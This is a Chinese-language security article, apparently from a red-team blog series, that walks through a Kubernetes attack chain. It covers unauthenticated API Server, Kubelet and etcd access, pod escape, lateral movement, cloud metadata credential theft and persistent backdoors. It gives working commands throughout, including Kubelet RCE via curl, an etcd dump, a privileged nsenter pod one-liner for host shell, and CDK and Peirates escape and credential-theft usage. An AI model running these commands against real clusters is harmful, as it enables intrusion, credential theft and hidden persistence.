---
title: 【云安全专题-9】Kubernetes 攻防实战：从 API Server 未授权到接管集群心脏
url: https://mp.weixin.qq.com/s/nsSE1BGva5Yn75EKdtdDeQ
source: Doonsec's feed
date: 2026-01-18
fetch_date: 2026-01-19T03:38:49.962492
---

# 【云安全专题-9】Kubernetes 攻防实战：从 API Server 未授权到接管集群心脏

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/nibcyUyib4otwNrVYNc2Ucw6zLnCLZ0qqZBWxz5Pxs7j6EiaibJZMNVRzqELR4oIGiblbGEDV3qHrvkH0xYKic6LHWiag/0?wx_fmt=jpeg)

# 【云安全专题-9】Kubernetes 攻防实战：从 API Server 未授权到接管集群心脏

原创

Ca1m
Ca1m

FunnyHacking

![]()

在小说阅读器中沉浸阅读

## 🏴‍☠️ 前言

如果说 Docker 是单个集装箱，Kubernetes (K8s) 就是掌管全球航运的超级港口。
在云原生攻防中，K8s 是绝对的“兵家必争之地”。对于攻击者而言，拿下一个 Pod 的 Shell 只是开始，**如何利用这个 Shell 作为跳板，横向移动窃取 Etcd 数据，甚至利用节点身份攻击云厂商的 IAM**，才是 K8s 攻防的精髓。

本章，我们将复盘红队视角下的 K8s 杀链（Kill Chain），从外网入口一步步杀入集群心脏。

## 一、 寻找入口：K8s 的三大门神

攻击 K8s 集群，首先要找到大门。通常有三个高频暴露的组件端口，一旦配置失误，就是灭顶之灾。

### 1. API Server (6443) —— 皇宫正门

这是 K8s 的核心大脑，所有指令都通过它流转。

* • **风险点**：**未授权访问 (Anonymous Auth)**。
  为了兼容性或配置疏忽，管理员可能开启了 `--anonymous-auth=true` 且绑定了高权限（如 `cluster-admin`）。
* • **实战检测**：
  直接访问 `https://<Target-IP>:6443/`。

+ • 如果是 `403 Forbidden` 或 `401 Unauthorized`，说明有认证（正常）。
+ • 如果是 **200 OK** 并返回路径列表，或者能访问 `/api/v1/pods`，恭喜，你可以直接下载 `kubectl` 接管集群了。

### 2. Kubelet (10250) —— 节点后门

Kubelet 是运行在每个 Node 节点上的“管家”。

* • **风险点**：**10250 端口未授权**。
  默认情况下，Kubelet 的 API 是需要认证的。但如果配置了 `--anonymous-auth=true`，攻击者可以直接控制该节点。
* • **实战利用**：

+ • **查看 Pod**：`curl -k https://<Node-IP>:10250/pods`
+ • **执行命令 (RCE)**：

  ```
  curl -k -X POST "https://<Node-IP>:10250/run/<namespace>/<pod>/<container>" -d "cmd=id"
  ```

  这相当于在该节点上的任意容器内执行 `docker exec`。

### 3. Etcd (2379) —— 核心账本

Etcd 存储了集群的所有状态信息，包括 **Secrets（账号密码、Token）**。

* • **风险点**：**无证书直接访问**。
  Etcd 默认监听 localhost，但如果被暴露在公网且没有配置 mTLS 证书。
* • **实战利用**：
  使用 `etcdctl` 不需要任何凭证，直接 dump 所有数据。

  ```
  etcdctl --endpoints=http://<Target-IP>:2379 get / --prefix --keys-only
  ```

  拿到数据后，过滤出 `secrets`，找到 ServiceAccount 的 Token，你就是管理员了。

### 4. Kubeconfig 泄露——被遗忘的钥匙

在 API Server 防护日益严密的今天，直接打 6443 端口越来越难。红队更多时候是在捡管理员丢下的钥匙。

* • **什么是 Kubeconfig**：
  它是 `kubectl` 的配置文件（默认为 `~/.kube/config`），里面包含了集群地址、CA 证书以及**管理员的 Token/Client 证书**。
* • **攻击场景**：

1. 1. **代码仓库泄露**：开发人员误将 config 文件提交到 GitHub。
2. 2. **跳板机搜集**：攻陷开发机/跳板机后，全盘搜索 `config` 文件或 `.kube` 目录。

* • **利用方式**：
  拿到这个文件，直接复制到本地：

  ```
  export KUBECONFIG=./leaked_config
  kubectl get pods
  # 此时你就是那个管理员
  ```

### 5. Kubernetes Dashboard 未授权

* • **风险点**：Dashboard 是 K8s 的官方 Web UI。早期版本默认存在未授权访问，或者管理员为了方便，创建了拥有 `cluster-admin` 权限的 ServiceAccount 并跳过了登录认证。
* • **实战**：
  访问 `https://<Target-IP>:<NodePort>`。如果进入后不需要输入 Token 直接看到了界面，或者能通过“跳过”按钮登录，即可在 Web 界面上使用“Web Shell”功能进入任意 Pod，或者直接上传 YAML 创建特权容器。

---

## 二、 内部突围：Pod 逃逸与权限提升

大多数情况下，我们通过 Web 漏洞（如 Log4j、RCE）获得的是一个 **低权限的 Pod Shell**。现在的目标是：**冲出 Pod，拿下 Node，进而拿下 Cluster**。

### 1. 它是谁？(ServiceAccount 枚举)

K8s 默认会把身份凭证挂载到 Pod 内部。

* • **位置**：`/var/run/secrets/kubernetes.io/serviceaccount/`

+ • `token`：身份令牌（JWT）。
+ • `ca.crt`：证书。

* • **检测**：
  使用 `kubectl`（如果容器里有）或 `curl` 带上 Token 访问 API Server，看看自己能干嘛。

  ```
  # 检查权限 (CDK 工具或手动 curl)
  kubectl auth can-i --list
  ```

### 2. RBAC 权限滥用 (Privilege Escalation)

如果当前 Pod 的 ServiceAccount 拥有以下“敏感权限”，即可提权：

* • **`create pods`**：创建一个挂载了宿主机根目录（`/`）的特权 Pod。
* • **`get secrets`**：读取 `cluster-admin` 的 Token。
* • **`impersonate`**：模拟管理员执行命令。

### 3. 挂载逃逸：/var/log 的秘密

参考 [TeamSSix 案例]，有时管理员为了收集日志，会将宿主机的 `/var/log` 挂载到 Pod 中。

* • **利用原理**：
  宿主机的 `/var/log` 下通常包含软链接或特定服务日志。
  如果我们可以操作 `/var/log`，虽然不能直接读 `/etc/shadow`，但可以通过**创建软链接**的方式诱导 Log Agent（通常是 Root 权限）去读取敏感文件并回显到日志系统中，或者配合其他服务特性进行文件覆盖。

### 4. CVE 助攻：CVE-2018-1002105 (旧但经典)

* • **原理**：K8s API Server 的聚合层（Aggregation Layer）逻辑错误。允许未授权用户通过伪造请求，直接与后端 API 通信，绕过鉴权。
* • **启示**：虽然现在很少见，但它提醒我们要关注 **Kubernetes 版本漏洞**。

---

## 三、 横向移动：从 Node 到 Cluster

拿下了单个节点（Node）后，如何控制其他节点，甚至 Master 节点？

### 1. 污点与容忍 (Taints & Tolerations)

你创建了一个恶意 Pod，想让它运行在 Master 节点上（通常 Master 节点存有更多敏感凭证），但 Master 节点通常带有“污点”（Taint），拒绝普通 Pod 调度。

* • **利用**：在你的恶意 Pod YAML 中添加 **`tolerations`**。

  ```
  tolerations:
  - key: "node-role.kubernetes.io/master"
    operator: "Exists"
    effect: "NoSchedule"
  ```

  这样，你的恶意 Pod 就能“容忍”污点，成功调度到 Master 节点并进行掠夺。

### 2. 恶意 DaemonSet (全网覆盖)

如果你拥有 `create daemonsets` 权限，这是最强的横向手段。

* • **原理**：DaemonSet 保证在**集群的每一个节点**上都运行一个 Pod。
* • **实战**：创建一个恶意的 DaemonSet，挂载宿主机根目录。瞬间，你就拥有了集群中**所有节点**的 Root Shell。

### 3. 网络攻击：ARP 欺骗与中间人

参考 **Wiz EKS Cluster Games** 的案例。

* • **场景**：K8s 的 Pod 网络通常是扁平的。
* • **利用**：如果网络策略（NetworkPolicy）未做隔离，被攻陷的 Pod 可以对同一网段的其他 Pod 发起 ARP 欺骗或 DNS 劫持，拦截数据库流量或 API Token。

---

## 四、 后渗透和持久化

现在的 K8s 大多跑在云上（托管版），这带来了新的攻击面：**云元数据（IMDS）**。

### 1. Pod 身份与云角色 (IRSA)

* • **机制**：AWS EKS 等允许将 IAM Role 绑定到 K8s 的 ServiceAccount 上。
* • **攻击**：
  如果攻陷的 Pod 绑定了高权限的 IAM Role（例如 S3 读写、EC2 管理），我们可以直接在 Pod 内访问云元数据服务，获取 **AWS 临时凭证**。

+ • **结果**：从 K8s 逃逸到 AWS 云控制台，接管云资源。

### 2. 节点元数据窃取

即使 Pod 没有绑定 IAM Role，宿主机 Node (EC2) 本身也有 IAM Role。
如果没开启 IMDSv2 或限制跳数，Pod 可以通过访问 `169.254.169.254` 窃取宿主机的凭证。

拿下集群不是结束，如何不被发现地留下来才是本事。

### 1. **静态 Pod (Static Pods) —— 僵尸复活**

* • **原理**：Kubelet 会自动监控 `/etc/kubernetes/manifests/` 目录。只要往里丢一个 YAML 文件，Kubelet 就会自动启动一个 Pod。

+ • **特点**：这种 Pod **不受 API Server 管理**！管理员在 `kubectl delete pod` 删掉它后，Kubelet 会立即自动重启它。就像打不死的僵尸。

- • **利用**：在拿下 Node 权限后，写入一个挖矿或后门 YAML 到该目录。

### **2. 准入控制器后门 (Mutating Admission Webhook)**

* • **原理**：K8s 允许在 Pod 启动前修改其配置（Mutating Webhook）。
* • **利用**：攻击者注册一个恶意的 Webhook。
* • **效果**：集群内**任何新创建的 Pod**，都会被自动注入一个 Sidecar 容器（后门）。这就实现了“全集群感染”，无论管理员怎么重启应用，后门永远存在。

### **3.影子 API Server (Shadow API Server)**

* • 如果控制了 Master 节点，可以修改 API Server 的配置，添加一个**隐藏的后门用户**或**静态 Token 文件**，即使管理员修改了 RBAC，你的后门 Token 依然有效。

---

## 五、 CDK、Peirates 与实战工具指南

在云原生攻防（特别是容器和 K8s 环境）中，环境通常非常精简（Distroless 镜像甚至没有 Shell），而且网络受限。因此，\*\*“单二进制文件”、“全静态编译”、“多功能合一”\*\*的工具是红队的最爱。

在容器或 Pod 的 Shell 里，我们往往面临着“家徒四壁”的窘境：没有 `ifconfig`，没有 `netstat`，甚至没有 `vi` 和 `ping`。这时候，一款优秀的后渗透工具就像瑞士军刀，能帮你瞬间完成**信息收集、漏洞扫描、自动逃逸和持久化**。

---

#### CDK (Container Datacenter Knife) —— 容器界的“Fscan”

**特点**：Go 语言编写，单文件无依赖，集成了几乎所有主流的容器/K8s 探测与利用模块。它是目前国内最火的云原生渗透工具。

### 核心用法

#### 1. 信息收集 (Evaluate)

当你刚拿下一个容器 Shell，不知道自己在哪、权限如何、能不能逃逸时，直接运行：

```
./cdk evaluate
```

* • **输出内容**：

+ • 当前环境是 Docker 还是 K8s？
+ • 是否有特权模式 (Privileged)？
+ • 挂载了哪些敏感目录 (Docker Socket)？
+ • Capabilities 有哪些危险权限？
+ • K8s ServiceAccount 敏感信息。

#### 2. 自动逃逸 (Auto Escape)

如果 `evaluate` 发现存在已知漏洞（如 `shim-pwn`, `cgroup-mount`），可以使用自动逃逸模块：

```
./cdk auto-escape <漏洞名称>
# 例如：
./cdk auto-escape mount-cgroup
```

它会自动执行挂载、写入 notify\_on\_release 等一系列复杂操作，尝试在宿主机执行命令。

#### 3. 工具箱 (Toolkits)

容器里没 `nc` 也没 `curl`？CDK 自带了简易版工具：

```
./cdk nc -lvvp 9999          # 开启监听
./cdk curl http://1.1.1.1    # 发送请求
./cdk ifconfig               # 查看网卡
```

#### 4. K8s 探测

如果发现目录下有 K8s 的 ServiceAccount Token，CDK 可以自动利用它探测 API Server：

```
./cdk kcurl get "https://kubernetes.default/api/v1/pods"
```

---

## Peirates —— K8s 集群渗透框架

**特点**：专注于 **Kubernetes 集群**的渗透。如果说 CDK 侧重于单点容器逃逸，Peirates 则侧重于在 K8s 集群内的**横向移动**和**凭证窃取**。

### 核心用法

Peirates 通常以交互模式运行，就像 Metasploit 一样。

```
./peirates
```

进入交互控制台后：

1. 1. **获取凭证**：

   ```
   peirates > get secrets
   peirates > get serviceaccounts
   ```

   它会自动尝试从默认路径、环境变量或 API Server 抓取凭证。
2. 2. **横向移动**：

   ```
   peirates > run pod --image busybox --cmd "cat /var/run/secrets/..."
   ```

   利用获取的凭证，尝试在其他节点创建恶意 Pod。
3. 3. **反弹 Shell**：
   Peirates 甚至可以自动注入一个反弹 Shell 到目标集群中。

---

## KDigger (Kubernetes Digger) —— 快速深挖

**特点**：极简的 K8s 信息收集工具，比 `kubectl` 输出更直观，专门用于回答“我到底有什么权限？”。

### 核心用法

```
# 一键挖掘所有信息
./kdigger dig all

# 专门检查当前 Token 的权限 (RBAC)
./kdigger dig rbac
```

**亮点**：它会生成一个非常直观的表格，告诉你当前的 ServiceAccount 是否有 `create pods`、`list secrets` 等高危权限。

---

## Kubectl —— 官方工具最致命

**特点**：有时候，官方的 `kubectl` 二进制文件就是最好的黑客工具。它稳定、功能全，而且**不会被杀毒软件查杀**。

### 骚操作用法

1. 1. **权限枚举 (Can-I)**：

   ```
   # 我能干啥？
   kubectl auth can-i --list
   ```
2. 2. **创建特权容器 (Bad Pod)**：
   如果你不想写复杂的 YAML，可以用 `kubectl run` 的参数（新版本已移除部分参数，建议用 JSON）：

   ```
   # 使用 JSON 覆盖配置，创建特权容器并挂载根目录
   kubectl run r00t --restart=Never -ti --rm --image=alpine --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}'
   ```

   **这行命令执行后，你就直接穿透到了宿主机的 Shell。**

---

#...